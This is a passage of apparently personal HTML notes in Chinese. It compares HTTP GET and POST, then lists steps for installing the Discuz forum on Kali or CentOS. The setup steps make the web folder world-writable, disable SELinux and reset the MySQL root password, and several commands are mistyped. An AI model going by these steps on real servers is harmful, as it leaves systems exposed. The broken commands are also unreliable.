+<ul style="margin:0px;padding:0px;border:0px none;margin-top:10px;margin-left:35px;margin-bottom:0px;">
+<li style="margin:0px;padding:0px;border:0px none;margin-top:3px;"><font style="font-size: 12px;"><em style="margin:0px;padding:0px;border:0px none;font-weight:bold;font-style:normal;">GET</em> - 从指定的资源请求数据。</font></li>
+<li style="margin:0px;padding:0px;border:0px none;margin-top:3px;"><font style="font-size: 12px;"><em style="margin:0px;padding:0px;border:0px none;font-weight:bold;font-style:normal;">POST</em> - 向指定的资源提交要被处理的数据</font></li>
+</ul>
+</div><div style="border:0px none;margin:0px 0px 0px 15px;padding:20px 0px;width:710px;border-width:1px 0px;border-style:solid none;border-color:rgb(170, 170, 170) -moz-use-text-color;border-image:none;">
+<h2 style="margin: 0px; padding: 0px; border: 0px none; font-weight: bold; font-family: 微软雅黑;"><font style="font-size: 12px;">GET 方法</font></h2>
+
+<p style="padding:0px;border:0px none;color:rgb(221, 0, 0);margin:12px 0px 0px;"><font style="font-size: 12px;">请注意，查询字符串（名称/值对）是在 GET 请求的 URL 中发送的：</font></p>
+
+<pre style="margin:10px 0px 0px;padding:10px;border:1px dotted rgb(119, 136, 85);font-family:Consolas,&quot;Courier New&quot;,Courier,monospace;width:685px;background:rgb(245, 245, 245) none repeat scroll 0% 0%;"><font style="font-size: 12px;">/test/demo_form.asp?name1=value1&amp;name2=value2</font></pre>
+
+<p style="padding:0px;border:0px none;margin:12px 0px 0px;"><font style="font-size: 12px;">有关 GET 请求的其他一些注释：</font></p>
+
+<ul style="margin:0px;padding:0px;border:0px none;margin-top:10px;margin-left:35px;margin-bottom:0px;">
+<li style="margin:0px;padding:0px;border:0px none;margin-top:3px;"><font style="font-size: 12px;">GET 请求可被缓存</font></li>
+<li style="margin:0px;padding:0px;border:0px none;margin-top:3px;"><font style="font-size: 12px;">GET 请求保留在浏览器历史记录中</font></li>
+<li style="margin:0px;padding:0px;border:0px none;margin-top:3px;"><font style="font-size: 12px;">GET 请求可被收藏为书签</font></li>
+<li style="margin:0px;padding:0px;border:0px none;margin-top:3px;"><font style="font-size: 12px;">GET 请求不应在处理敏感数据时使用</font></li>
+<li style="margin:0px;padding:0px;border:0px none;margin-top:3px;"><font style="font-size: 12px;">GET 请求有长度限制</font></li>
+<li style="margin:0px;padding:0px;border:0px none;margin-top:3px;"><font style="font-size: 12px;">GET 请求只应当用于取回数据</font></li>
+</ul>
+</div><div style="border:0px none;margin:0px 0px 0px 15px;padding:20px 0px;width:710px;border-width:1px 0px;border-style:solid none;border-color:rgb(170, 170, 170) -moz-use-text-color;border-image:none;">
+<h2 style="margin: 0px; padding: 0px; border: 0px none; font-weight: bold; font-family: 微软雅黑;"><font style="font-size: 12px;">POST 方法</font></h2>
+
+<p style="padding:0px;border:0px none;color:rgb(221, 0, 0);margin:12px 0px 0px;"><font style="font-size: 12px;">请注意，查询字符串（名称/值对）是在 POST 请求的 HTTP 消息主体中发送的：</font></p>
+
+<pre style="margin:10px 0px 0px;padding:10px;border:1px dotted rgb(119, 136, 85);font-family:Consolas,&quot;Courier New&quot;,Courier,monospace;width:685px;background:rgb(245, 245, 245) none repeat scroll 0% 0%;"><font style="font-size: 12px;">POST /test/demo_form.asp HTTP/1.1
+Host: w3schools.com
+name1=value1&amp;name2=value2
+</font></pre>
+
+<p style="padding:0px;border:0px none;margin:12px 0px 0px;"><font style="font-size: 12px;">有关 POST 请求的其他一些注释：</font></p>
+
+<ul style="margin:0px;padding:0px;border:0px none;margin-top:10px;margin-left:35px;margin-bottom:0px;">
+<li style="margin:0px;padding:0px;border:0px none;margin-top:3px;"><font style="font-size: 12px;">POST 请求不会被缓存</font></li>
+<li style="margin:0px;padding:0px;border:0px none;margin-top:3px;"><font style="font-size: 12px;">POST 请求不会保留在浏览器历史记录中</font></li>
+<li style="margin:0px;padding:0px;border:0px none;margin-top:3px;"><font style="font-size: 12px;">POST 不能被收藏为书签</font></li>
+<li style="margin:0px;padding:0px;border:0px none;margin-top:3px;"><font style="font-size: 12px;">POST 请求对数据长度没有要求</font></li>
+</ul>
+</div><div style="border:0px none;margin:0px 0px 0px 15px;padding:20px 0px;width:710px;border-width:1px 0px;border-style:solid none;border-color:rgb(170, 170, 170) -moz-use-text-color;border-image:none;">
+<h2 style="margin: 0px; padding: 0px; border: 0px none; font-weight: bold; font-family: 微软雅黑;"><font style="font-size: 12px;">比较 GET 与 POST</font></h2>
+
+<p style="padding:0px;border:0px none;margin:12px 0px 0px;"><font style="font-size: 12px;">下面的表格比较了两种 HTTP 方法：GET 和 POST。</font></p>
+
+<table style="font-weight: inherit; font-style: inherit; font-variant-ligatures: inherit; font-variant-position: inherit; font-variant-caps: inherit; font-variant-numeric: inherit; font-variant-alternates: inherit; font-variant-east-asian: inherit; margin: 10px 0px 0px; padding: 0px; border: 1px solid rgb(170, 170, 170); border-collapse: collapse; width: 100%;">
+<tbody style="margin:0px;padding:0px;border:0px none;"><tr style="margin:0px;padding:0px;border:0px none;">
+<th style="margin:0px;padding:5px 15px 5px 6px;border:1px solid rgb(170, 170, 170);vertical-align:baseline;background-color:rgb(213, 213, 213);text-align:left;width:20%;"><font style="font-size: 12px;"> </font></th>
+<th style="margin:0px;padding:5px 15px 5px 6px;border:1px solid rgb(170, 170, 170);vertical-align:baseline;background-color:rgb(213, 213, 213);text-align:left;"><font style="font-size: 12px;">GET</font></th>
+<th style="margin:0px;padding:5px 15px 5px 6px;border:1px solid rgb(170, 170, 170);vertical-align:baseline;background-color:rgb(213, 213, 213);text-align:left;"><font style="font-size: 12px;">POST</font></th>
+</tr>
+
+<tr style="margin:0px;padding:0px;border:0px none;">
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">后退按钮/刷新</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">无害</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">数据会被重新提交（浏览器应该告知用户数据会被重新提交）。</font></td>
+</tr>
+
+<tr style="margin:0px;padding:0px;border:0px none;">
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">书签</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">可收藏为书签</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">不可收藏为书签</font></td>
+</tr>
+
+<tr style="margin:0px;padding:0px;border:0px none;">
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">缓存</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">能被缓存</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">不能缓存</font></td>
+</tr>
+
+<tr style="margin:0px;padding:0px;border:0px none;">
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">编码类型</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">application/x-www-form-urlencoded</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">application/x-www-form-urlencoded 或 multipart/form-data。为二进制数据使用多重编码。</font></td>
+</tr>
+
+<tr style="margin:0px;padding:0px;border:0px none;">
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">历史</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">参数保留在浏览器历史中。</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">参数不会保存在浏览器历史中。</font></td>
+</tr>
+
+<tr style="margin:0px;padding:0px;border:0px none;">
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">对数据长度的限制</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">是的。当发送数据时，GET 方法向 URL 添加数据；URL 的长度是受限制的（URL 的最大长度是 2048 个字符）。</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">无限制。</font></td>
+</tr>
+
+<tr style="margin:0px;padding:0px;border:0px none;">
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">对数据类型的限制</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">只允许 ASCII 字符。</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">没有限制。也允许二进制数据。</font></td>
+</tr>
+
+<tr style="margin:0px;padding:0px;border:0px none;">
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">安全性</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><p style="padding:0px;border:0px none;margin:0px;"><font style="font-size: 12px;">与 POST 相比，GET 的安全性较差，因为所发送的数据是 URL 的一部分。</font></p>
+<p style="padding:0px;border:0px none;margin:12px 0px 0px;"><font style="font-size: 12px;">在发送密码或其他敏感信息时绝不要使用 GET ！</font></p></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">POST 比 GET 更安全，因为参数不会被保存在浏览器历史或 web 服务器日志中。</font></td>
+</tr>
+
+<tr style="margin:0px;padding:0px;border:0px none;">
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">可见性</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">数据在 URL 中对所有人都是可见的。</font></td>
+<td style="margin:0px;padding:6px 15px 6px 6px;border:1px solid rgb(170, 170, 170);vertical-align:text-top;background-color:rgb(239, 239, 239);"><font style="font-size: 12px;">数据不会显示在 URL 中。</font></td>
+</tr>
+</tbody></table>
+</div></div><br/></div></td></tr></tbody></table></font></li></ul></div><hr style="font-size: 16px;"/><p style="font-size: 16px;"/></div></div></div><div/><div/><div><font style="font-weight: bold; font-family: Menlo; font-size: 18px; font-style: italic; color: rgb(64, 23, 243);">配置安装discuz</font></div><div><font style="font-weight: bold; font-family: Menlo; font-size: 18px; font-style: italic; color: rgb(64, 23, 243);"/></div><div><div><hr/></div><table style="width: 100%;"><tbody><tr><td style="width: 100%; border: 1px solid rgb(219, 219, 219); padding: 10px; margin: 0px;"><div>安装rar解压工具 wget <a href="http://www.rarsoft.com/rar/rarlinux-3.9.3.tar.gz">http://www.rarsoft.com/rar/rarlinux-3.9.3.tar.gz</a><br/>                           tar -zxvf rarlinux-3.9.3.tar.gz<br/>                           cd rar<br/>                           make<br/>看见下面这些信息就是安装成功了：<br/> <i><font style="font-size: 12px;">mkdir -p /usr/local/bin<br/> mkdir -p /usr/local/lib<br/> cp rar unrar /usr/local/bin<br/> cp rarfiles.lst /etc<br/> cp default.sfx /usr/local/lib</font></i><br/>常用rar命令：<br/>rar x centos.rar //解压 centos.rar 到当前目录<br/>rar centos.rar ./piaoyi.org/ //将 <a href="http://piaoyi.org">piaoyi.org</a> 目录打包为 centos.rar <br/></div></td></tr></tbody></table><ul><li>移动discuz.rar到/var/www/html下</li><li>解压discus.rar到/var/www/html   rar x discuz.rar</li><li>修改discuz文件夹的权限: chmod -R 777 discuz/</li><li>修改php.ini文件内容：</li><li>                                 cd /etc/  //注：kali下有两个php.ini，分别在/etc/php5/cli/及/etc/php5/apache2/路径下</li><li>                                 vim php.ini</li><li>                                 修改  <i>;short_open_tag  </i>为  <i>short_open_tag:No </i></li><li><i>                                 修改   short_open_tag=Off 为 short_open_tag = No</i></li><li>删除install.lock :</li><li>                          cd /var/www/html/discuz</li><li>                          rm -rf install.lock</li><li>重启apache:  service httpd restart //kali下为service apache2 restart</li><li>安装discuz ：firefox 中 192.x.x.x/discuz/install</li><li>若无法进入安装出现访问受限输入命令<font style="font-family: Menlo; font-size: 11px;"> </font><font style="font-family: Menlo; font-size: 14px;">setenforce 0  (CentOS下)</font></li><li>出现乱码，修改文字编码</li><li>到填写信息一步时</li><li><table style="width: 100%; border-collapse: collapse; table-layout: fixed;"><tbody><tr><td style="width: 100%; border: 1px solid rgb(219, 219, 219); padding: 10px; margin: 0px;"><div><ol><li>mysql -u root -p //以空密码进入mysql<br/></li><li>若密码不对则进入./mysqld目录下</li><li>关闭mysql服务 service mysql stop</li><li>进入单用户模式：./mysqld  - -skip -grant-tables</li><li>此时开启新终端：mysql -u root -p</li><li>修改密码 ： update mysql.user set password=("mima”);(回车)flush privileges;</li><li>退出 ：exit</li><li>杀掉进程：kill -9 pid_number (ps -ef | grep mysql//查看进程号)</li><li>启用 mysql ： service mysqld start</li></ol></div></td></tr></tbody></table></li></ul></div><div><div/></div><div/><div><ul><li>安装步骤继续向下执行</li></ul></div><div><hr/><span style="font: 11.0px Menlo; font-variant-ligatures: no-common-ligatures"> </span></div><div><font face="Menlo"><span style="font-size: 11px;"><br/></span></font></div><div><font face="Menlo"><span style="font-size: 11px;"><br/></span></font></div><div><br/></div></body></html>
